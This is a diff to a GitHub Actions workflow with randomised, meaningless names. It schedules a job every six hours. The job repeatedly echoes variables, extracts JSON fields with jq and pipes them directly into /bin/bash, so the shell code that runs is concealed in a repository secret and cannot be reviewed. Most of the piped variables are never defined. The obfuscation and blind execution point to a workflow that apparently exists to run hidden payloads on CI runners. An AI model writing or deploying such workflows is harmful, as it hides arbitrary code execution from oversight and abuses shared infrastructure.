@@ -1,26 +1,24 @@
 name: yushituoqie
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 1/6 * * *'
-
-jobs:  # 881
+    - cron: '23 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yushituoqie
         env:
-          ntv763: ${{ secrets.ntv763 }}
+          ultf1: ${{ secrets.ultf1 }}
         run: |
-          echo $ntv763 | jq -r .opkxj38 | /bin/bash
-          echo $uvllu20 | jq -r .ycbuf416 | /bin/bash
-          echo $b3 | jq -r .kw36398 | /bin/bash
-          echo $jpn156 | jq -r .x5 | /bin/bash
-          echo $tgkmm77 | jq -r .nzeax59960 | /bin/bash
-          echo $cpb6293 | jq -r .dn9 | /bin/bash
-          echo $nlaiv852 | jq -r .n985 | /bin/bash
-          echo $yd322 | jq -r .m02594 | /bin/bash
-          echo $hteh6 | jq -r .ve6241 | /bin/bash
+          echo $ultf1 | jq -r .mifx06 | /bin/bash
+          echo $cin772 | jq -r .pi573 | /bin/bash
+          echo $xlj520 | jq -r .tolmq44 | /bin/bash
+          echo $nxr68 | jq -r .k54274 | /bin/bash
+          echo $tqky7967 | jq -r .yycb569 | /bin/bash
+          echo $gjq799 | jq -r .izs2711 | /bin/bash
+          echo $zsg81 | jq -r .ch9983 | /bin/bash
+          echo $xob16 | jq -r .z222 | /bin/bash
 
